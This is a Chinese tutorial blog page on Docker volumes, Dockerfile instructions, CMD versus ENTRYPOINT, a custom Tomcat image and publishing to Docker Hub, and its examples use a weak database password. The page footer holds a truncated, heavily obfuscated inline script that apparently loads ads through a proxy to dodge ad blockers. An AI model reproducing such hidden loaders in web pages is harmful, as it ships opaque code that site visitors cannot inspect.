<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker images</span>
REPOSITORY            TAG       IMAGE ID       CREATED         SIZE
tomcat02              <span class="token number">1.0</span>       2a9f9f5e8186   <span class="token number">4</span> seconds ago   684MB
tomcat                latest    b0e0b0a92cf9   <span class="token number">2</span> weeks ago     680MB
nginx                 latest    87a94228f133   <span class="token number">3</span> weeks ago     133MB
centos                latest    5d0da3dc9764   <span class="token number">7</span> weeks ago     231MB
portainer/portainer   latest    580c0e4e98b0   <span class="token number">7</span> months ago    <span class="token number">79</span>.1MB
elasticsearch         <span class="token number">7.6</span>.2     f29a1ee41030   <span class="token number">19</span> months ago   791MB

</code></pre> 
<h3>
<a id="_515"></a>容器数据卷</h3> 
<p>如果数据在容器里，容器删了后数据会丢失</p> 
<p><strong>需求：数据持久化</strong></p> 
<p>数据可以存储在本地</p> 
<p>目录的挂载</p> 
<p><img src="https://images2.imgbox.com/0c/a9/qIYA1aST_o.png" alt=""></p> 
<p>容器的持久化和同步操作，容器间可以数据共享</p> 
<pre><code class="prism language-shell">docker run -v 本机目录:容器目录
docker run -it -v /home/ceshi:/home centos /bin/bash
<span class="token comment">#类似于把本机目录挂载到容器目录，双向绑定</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/6a/27/SJUC9qF0_o.png" alt=""></p> 
<p>测试</p> 
<pre><code class="prism language-shell">docker pull mysql:5.7

docker run -d -p <span class="token number">3310</span>:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> --name mysql02 mysql:5.7

</code></pre> 
<h4>
<a id="_550"></a>具名和匿名挂载</h4> 
<pre><code class="prism language-shell"><span class="token comment">#匿名挂载</span>
-v容器内的路径
docker run -d -P --name nginx01 -v /etc/nginx nginx

<span class="token comment">#查看所有volume</span>
<span class="token punctuation">[</span>root@VM-0-15-centos data<span class="token punctuation">]</span><span class="token comment"># docker volume ls</span>
DRIVER    VOLUME NAME
<span class="token builtin class-name">local</span>     a8af848d9eaef19d1f4250e67d4036f0dd6972d91d61d72370d363637f196cfb

<span class="token comment">#具名挂载</span>
<span class="token punctuation">[</span>root@VM-0-15-centos data<span class="token punctuation">]</span><span class="token comment"># docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx</span>
82c334c8dca81c12780d2b0698e27495dad4733b7fab15a44944d8ba6e892ff2
<span class="token punctuation">[</span>root@VM-0-15-centos data<span class="token punctuation">]</span><span class="token comment"># docker volume ls</span>
DRIVER    VOLUME NAME
<span class="token builtin class-name">local</span>     a8af848d9eaef19d1f4250e67d4036f0dd6972d91d61d72370d363637f196cfb
<span class="token builtin class-name">local</span>     juming-nginx

<span class="token comment">#查看路径</span>
<span class="token punctuation">[</span>root@VM-0-15-centos data<span class="token punctuation">]</span><span class="token comment"># docker volume inspect juming-nginx </span>
<span class="token punctuation">[</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token string">"CreatedAt"</span><span class="token builtin class-name">:</span> <span class="token string">"2021-11-08T16:59:02+08:00"</span>,
        <span class="token string">"Driver"</span><span class="token builtin class-name">:</span> <span class="token string">"local"</span>,
        <span class="token string">"Labels"</span><span class="token builtin class-name">:</span> null,
        <span class="token string">"Mountpoint"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/volumes/juming-nginx/_data"</span>,
        <span class="token string">"Name"</span><span class="token builtin class-name">:</span> <span class="token string">"juming-nginx"</span>,
        <span class="token string">"Options"</span><span class="token builtin class-name">:</span> null,
        <span class="token string">"Scope"</span><span class="token builtin class-name">:</span> <span class="token string">"local"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">]</span>

</code></pre> 
<p>大多使用具名挂载</p> 
<pre><code class="prism language-shell"><span class="token comment"># 三种挂载： 匿名挂载、具名挂载、指定路径挂载</span>
-v 容器内路径 <span class="token comment">#匿名挂载</span>
-v 卷名：容器内路径 <span class="token comment">#具名挂载</span>
-v /宿主机路径：容器内路径 <span class="token comment">#指定路径挂载 docker volume ls 是查看不到的</span>
</code></pre> 
<p>拓展：</p> 
<pre><code class="prism language-shell"><span class="token comment"># 通过 -v 容器内路径： ro rw 改变读写权限</span>
ro <span class="token comment">#readonly 只读</span>
rw <span class="token comment">#readwrite 可读可写</span>
docker run -d -P --name nginx05 -v juming:/etc/nginx:ro nginx
docker run -d -P --name nginx05 -v juming:/etc/nginx:rw nginx
<span class="token comment"># ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内部是无法操作！</span>
</code></pre> 
<p>构建docker镜像的构建文件，命令脚本</p> 
<pre><code class="prism language-shell">FROM centos
VOLUME <span class="token punctuation">[</span><span class="token string">"volume01"</span>,<span class="token string">"volume02"</span><span class="token punctuation">]</span>
CMD <span class="token builtin class-name">echo</span> <span class="token string">"----end----"</span>
CMD /bin/bash
</code></pre> 
<pre><code class="prism language-shell">--volumes-from list Mount volumes from the specified container<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token comment"># 测试，我们通过刚才启动的</span>
docker run -d -p <span class="token number">3306</span>:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v
/home/mysql/data:/var/lib/mysql -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> --name mysql01
mysql:5.7
docker run -d -p <span class="token number">3307</span>:3306 -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> --name
mysql02 --volumes-from mysql01 mysql:5.7
<span class="token comment"># 这个时候，可以实现两个容器数据同步！</span>
</code></pre> 
<p>容器之间的配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止。<br> 但是一旦你持久化到了本地，这个时候，本地的数据是不会删除的！</p> 
<h3>
<a id="DockerFile_629"></a>DockerFile</h3> 
<h4>
<a id="1DockerFile_631"></a>1.DockerFile介绍</h4> 
<p>dockerfile 是用来构建docker镜像的文件！命令参数脚本！<br> 构建步骤：<br> 1、 编写一个dockerfile文件<br> 2、 docker build 构建称为一个镜像<br> 3、 docker run运行镜像<br> 4、 docker push发布镜像（DockerHub 、阿里云仓库)<br> 但是很多官方镜像都是基础包，很多功能没有，我们通常会自己搭建自己的镜像！<br> 官方既然可以制作镜像，那我们也可以！</p> 
<h4>
<a id="2DockerFile_641"></a>2.DockerFile构建过程</h4> 
<p><strong>基础知识：</strong></p> 
<p>1、每个保留关键字(指令）都是必须是大写字母<br> 2、执行从上到下顺序<br> 3、#表示注释<br> 4、每一个指令都会创建提交一个新的镜像层，并提交！</p> 
<p>Dockerfile是面向开发的，我们以后要发布项目，做镜像，就需要编写dockerfile文件，这个文件十分简<br> 单！<br> Docker镜像逐渐成企业交付的标准，必须要掌握！<br> DockerFile：构建文件，定义了一切的步骤，源代码<br> DockerImages：通过DockerFile构建生成的镜像，最终发布和运行产品。<br> Docker容器：容器就是镜像运行起来提供服务。</p> 
<h4>
<a id="3DockerFile_657"></a>3.DockerFile的指令</h4> 
<pre><code class="prism language-shell"><span class="token comment"># DockerFile常用指令</span>
FROM 		<span class="token comment"># 基础镜像，一切从这里开始构建</span>
MAINTAINER 	<span class="token comment"># 镜像是谁写的， 姓名+邮箱</span>
RUN 		<span class="token comment"># 镜像构建的时候需要运行的命令</span>
ADD 		<span class="token comment"># 步骤，tomcat镜像，这个tomcat压缩包！添加内容 添加同目录</span>
WORKDIR 	<span class="token comment"># 镜像的工作目录</span>
VOLUME 		<span class="token comment"># 挂载的目录</span>
EXPOSE 		<span class="token comment"># 保留端口配置</span>
CMD 		<span class="token comment"># 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代。</span>
ENTRYPOINT 	<span class="token comment"># 指定这个容器启动的时候要运行的命令，可以追加命令</span>
ONBUILD 	<span class="token comment"># 当构建一个被继承 DockerFile 这个时候就会运行ONBUILD的指令，触发指令。</span>
COPY 		<span class="token comment"># 类似ADD，将我们文件拷贝到镜像中</span>
ENV 		<span class="token comment"># 构建的时候设置环境变量！</span>
</code></pre> 
<p>FROM scratch</p> 
<blockquote> 
 <p>创建centos</p> 
</blockquote> 
<pre><code class="prism language-shell"><span class="token comment">#1.编写dockerfile</span>
FROM centos
MAINTAINER ghhgy<span class="token operator">&lt;</span>你的邮箱<span class="token operator">&gt;</span>

ENV MYPATH /usr/local
WORKDIR <span class="token variable">$MYPATH</span>

RUN yum -y <span class="token function">install</span> <span class="token function">vim</span>
RUN yum -y <span class="token function">install</span> net-tools

EXPOSE <span class="token number">80</span>
CMD <span class="token builtin class-name">echo</span> <span class="token variable">$MYPATH</span>
CMD <span class="token builtin class-name">echo</span> <span class="token string">"----end----"</span>
CMD /bin/bash

<span class="token comment">#2.构建镜像</span>
docker build -f mydockerfile-centos -t mycentos:0.1 <span class="token builtin class-name">.</span>

<span class="token comment">#3.运行测试，默认工作目录变成了/usr/local，支持了vim和ifconfig命令</span>

<span class="token comment">#查看镜像构建历史</span>
<span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># docker history 9956616c2ab2</span>
IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT
9956616c2ab2   <span class="token number">5</span> minutes ago   /bin/sh -c <span class="token comment">#(nop)  CMD ["/bin/sh" "-c" "/bin…   0B        </span>
b300db55d9c9   <span class="token number">5</span> minutes ago   /bin/sh -c <span class="token comment">#(nop)  CMD ["/bin/sh" "-c" "echo…   0B        </span>
e5c27ca58c9c   <span class="token number">6</span> minutes ago   /bin/sh -c <span class="token comment">#(nop)  CMD ["/bin/sh" "-c" "echo…   0B        </span>
b100a7b87ba1   <span class="token number">6</span> minutes ago   /bin/sh -c <span class="token comment">#(nop)  EXPOSE 80                    0B        </span>
680c65bf9616   <span class="token number">6</span> minutes ago   /bin/sh -c yum -y <span class="token function">install</span> net-tools             <span class="token number">33</span>.7MB    
3d2b83702280   <span class="token number">6</span> minutes ago   /bin/sh -c yum -y <span class="token function">install</span> <span class="token function">vim</span>                   75MB      
80225a43f177   <span class="token number">8</span> minutes ago   /bin/sh -c <span class="token comment">#(nop) WORKDIR /usr/local            0B        </span>
7984a76b67ce   <span class="token number">8</span> minutes ago   /bin/sh -c <span class="token comment">#(nop)  ENV MYPATH=/usr/local        0B        </span>
a7c6e1014333   <span class="token number">8</span> minutes ago   /bin/sh -c <span class="token comment">#(nop)  MAINTAINER ghhgy&lt;super.pa…   0B        </span>
5d0da3dc9764   <span class="token number">7</span> weeks ago     /bin/sh -c <span class="token comment">#(nop)  CMD ["/bin/bash"]            0B        </span>
<span class="token operator">&lt;</span>missing<span class="token operator">&gt;</span>      <span class="token number">7</span> weeks ago     /bin/sh -c <span class="token comment">#(nop)  LABEL org.label-schema.sc…   0B        </span>
<span class="token operator">&lt;</span>missing<span class="token operator">&gt;</span>      <span class="token number">7</span> weeks ago     /bin/sh -c <span class="token comment">#(nop) ADD file:805cb5e15fb6e0bb0…   231MB     </span>

</code></pre> 
<blockquote> 
 <p>CMD 和 ENTYPOINT 区别</p> 
</blockquote> 
<pre><code class="prism language-shell">CMD 		<span class="token comment"># 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代。</span>
ENTRYPOINT 	<span class="token comment"># 指定这个容器启动的时候要运行的命令，可以追加命令</span>
</code></pre> 
<p>测试CMD</p> 
<pre><code class="prism language-shell"><span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># cat dockerfile-centos-cmd </span>
FROM centos
CMD <span class="token punctuation">[</span><span class="token string">"ls"</span>,<span class="token string">"-a"</span><span class="token punctuation">]</span>

<span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># docker build -f dockerfile-centos-cmd -t cmdtest .</span>

<span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># docker run cmdtest</span>
<span class="token builtin class-name">.</span>
<span class="token punctuation">..</span>
.dockerenv
bin
dev
etc
home
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

<span class="token comment">#想追加一个-l</span>
<span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># docker run cmdtest -l</span>
docker: Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: exec: <span class="token string">"-l"</span><span class="token builtin class-name">:</span> executable <span class="token function">file</span> not found <span class="token keyword">in</span> <span class="token environment constant">$PATH</span><span class="token builtin class-name">:</span> unknown.
<span class="token comment"># cmd的情况下 -l 替换了CMD["ls","-l"] ，-l 不是命令所以报错</span>
</code></pre> 
<p>测试ENTRYPOINT</p> 
<pre><code class="prism language-shell"><span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># cat dockerfile-centos-entrypoint </span>
FROM centos
ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"ls"</span>,<span class="token string">"-a"</span><span class="token punctuation">]</span>

<span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># docker build -f dockerfile-centos-entrypoint -t entrypoint-test .</span>

<span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># docker run entrypoint-test</span>
<span class="token builtin class-name">.</span>
<span class="token punctuation">..</span>
.dockerenv
bin
dev
etc
home
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

<span class="token punctuation">[</span>root@VM-0-15-centos dockerfile<span class="token punctuation">]</span><span class="token comment"># docker run entrypoint-test -l</span>
total <span class="token number">56</span>
drwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Nov  <span class="token number">8</span> <span class="token number">10</span>:19 <span class="token builtin class-name">.</span>
drwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Nov  <span class="token number">8</span> <span class="token number">10</span>:19 <span class="token punctuation">..</span>
-rwxr-xr-x   <span class="token number">1</span> root root    <span class="token number">0</span> Nov  <span class="token number">8</span> <span class="token number">10</span>:19 .dockerenv
lrwxrwxrwx   <span class="token number">1</span> root root    <span class="token number">7</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> bin -<span class="token operator">&gt;</span> usr/bin
drwxr-xr-x   <span class="token number">5</span> root root  <span class="token number">340</span> Nov  <span class="token number">8</span> <span class="token number">10</span>:19 dev
drwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Nov  <span class="token number">8</span> <span class="token number">10</span>:19 etc
drwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> home
lrwxrwxrwx   <span class="token number">1</span> root root    <span class="token number">7</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> lib -<span class="token operator">&gt;</span> usr/lib
lrwxrwxrwx   <span class="token number">1</span> root root    <span class="token number">9</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> lib64 -<span class="token operator">&gt;</span> usr/lib64
drwx------   <span class="token number">2</span> root root <span class="token number">4096</span> Sep <span class="token number">15</span> <span class="token number">14</span>:17 lost+found
drwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> media
drwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> mnt
drwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> opt
dr-xr-xr-x <span class="token number">142</span> root root    <span class="token number">0</span> Nov  <span class="token number">8</span> <span class="token number">10</span>:19 proc
dr-xr-x---   <span class="token number">2</span> root root <span class="token number">4096</span> Sep <span class="token number">15</span> <span class="token number">14</span>:17 root
drwxr-xr-x  <span class="token number">11</span> root root <span class="token number">4096</span> Sep <span class="token number">15</span> <span class="token number">14</span>:17 run
lrwxrwxrwx   <span class="token number">1</span> root root    <span class="token number">8</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> sbin -<span class="token operator">&gt;</span> usr/sbin
drwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Nov  <span class="token number">3</span>  <span class="token number">2020</span> srv
dr-xr-xr-x  <span class="token number">13</span> root root    <span class="token number">0</span> Nov  <span class="token number">8</span> <span class="token number">10</span>:17 sys
drwxrwxrwt   <span class="token number">7</span> root root <span class="token number">4096</span> Sep <span class="token number">15</span> <span class="token number">14</span>:17 tmp
drwxr-xr-x  <span class="token number">12</span> root root <span class="token number">4096</span> Sep <span class="token number">15</span> <span class="token number">14</span>:17 usr
drwxr-xr-x  <span class="token number">20</span> root root <span class="token number">4096</span> Sep <span class="token number">15</span> <span class="token number">14</span>:17 var
<span class="token comment"># ENTRYPOINT的情况下 -l 拼接在ENTRYPOINT命令后</span>
</code></pre> 
<p>Dockerfile中很多命令都十分的相似，我们需要了解它们的区别，我们最好的学习就是对比他们然后测<br> 试效果！</p> 
<h4>
<a id="4Tomcat_835"></a>4.实战：Tomcat镜像</h4> 
<p>1、准备镜像文件<br> 准备tomcat 和 jdk到当前目录，编写好README 。</p> 
<pre><code class="prism language-shell"><span class="token punctuation">[</span>root@VM-0-15-centos webapps<span class="token punctuation">]</span><span class="token comment"># cat /home/mytomcat/Dockerfile </span>
FROM centos
MAINTAINER ghhgy<span class="token operator">&lt;</span>你的邮箱<span class="token operator">&gt;</span>

COPY readme.txt /usr/local/readme.txt

ADD jdk-8u211-linux-x64.tar.gz /usr/local/
ADD apache-tomcat-9.0.29.tar.gz /usr/local/

RUN yum -y <span class="token function">install</span> <span class="token function">vim</span>

ENV MYPATH /usr/local
WORKDIR <span class="token variable">$MYPATH</span>

ENV JAVA_HOME /usr/local/jdk1.8.0_211
ENV CLASSPATH <span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar
ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.29
ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.29
ENV <span class="token environment constant">PATH</span> <span class="token environment constant">$PATH</span><span class="token builtin class-name">:</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$CATALINA_HOME</span>/lib:<span class="token variable">$CATALINA_HOME</span>/bin
EXPOSE <span class="token number">8080</span>

CMD /usr/local/apache-tomcat-9.0.29/bin/startup.sh <span class="token operator">&amp;&amp;</span> <span class="token function">tail</span> -F /usr/local/apache-tomcat-9.0.29/logs/catalina.out

</code></pre> 
<p>2、构建镜像</p> 
<pre><code class="prism language-shell">docker build -t diytomcat <span class="token builtin class-name">.</span>
</code></pre> 
<p>3、运行镜像并挂载卷</p> 
<pre><code class="prism language-shell">docker run -d -p <span class="token number">8081</span>:8080 -v /home/mytomcat/webapps/test:/usr/local/apache-tomcat-9.0.29/webapps/test -v /home/mytomcat/logs:/usr/local/apache-tomcat-9.0.29/logs diytomcat
</code></pre> 
<p>4、在本机/home/mytomcat/webapps/test目录下新建WEB-INFO/web.xml和index.jsp</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span>
         <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span>
         <span class="token attr-name">metadata-complete</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<pre><code class="prism language-jsp">&lt;%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
Hello World!&lt;br/&gt;
&lt;%
out.println("你的 IP 地址 " + request.getRemoteAddr());
%&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre> 
<p>进入test的url进行访问</p> 
<h4>
<a id="5_911"></a>5.发布自己的镜像</h4> 
<p>1、地址 https://hub.docker.com/<br> 2、确定这个账号可以登录<br> 3、登录</p> 
<pre><code class="prism language-shell"><span class="token punctuation">[</span>root@VM-0-15-centos test<span class="token punctuation">]</span><span class="token comment"># docker login --help</span>

Usage:  docker login <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token punctuation">[</span>SERVER<span class="token punctuation">]</span>

Log <span class="token keyword">in</span> to a Docker registry.
If no server is specified, the default is defined by the daemon.

Options:
  -p, --password string   Password
      --password-stdin    Take the password from stdin
  -u, --username string   Username
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#1、登录</span>
docker login -u ghhgy
<span class="token comment">#2、把当前的diytomcat:latest tag改成ghhgy/tomcat:1.0，否则无法push</span>
docker tag diytomcat:latest ghhgy/tomcat:1.0
<span class="token comment">#3、push镜像到dockerhub</span>
docker push ghhgy/tomcat:1.0



</code></pre> 
<h4>
<a id="_943"></a>小结</h4> 
<p><img src="https://images2.imgbox.com/43/85/lZG9WPIf_o.png" alt=""></p> 
<h3>
<a id="Docker_947"></a>Docker网络</h3>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,